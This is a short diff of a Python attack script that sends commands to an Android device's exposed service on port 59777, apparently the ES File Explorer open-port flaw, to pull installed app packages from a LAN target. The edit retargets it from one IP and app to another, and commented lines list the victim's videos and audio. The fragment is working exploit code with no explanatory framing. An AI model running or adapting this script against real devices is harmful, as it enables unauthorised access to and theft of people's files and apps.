@@ -7,7 +7,7 @@
 import requests
 import json
 
-TARGET_HOST = "http://192.168.253.9:59777"
+TARGET_HOST = "http://192.168.253.6:59777"
 
 
 def CommandRequest(**kwargs):
@@ -40,8 +40,8 @@ if __name__ == "__main__":
     # print(listVideos)
     # print(listAudios)
 
-    appPull = CommandRequest(command="appPull", appPackageName='com.bullet.messenger')  # 获取目标apk
-    with open("com.bullet.messenger.apk", "wb") as f:
+    appPull = CommandRequest(command="appPull", appPackageName='org.getlantern.lantern')  # 获取目标apk
+    with open("org.getlantern.lantern.apk", "wb") as f:
         f.write(appPull)
 
     # url = "http://172.30.166.2:42135/hostname"
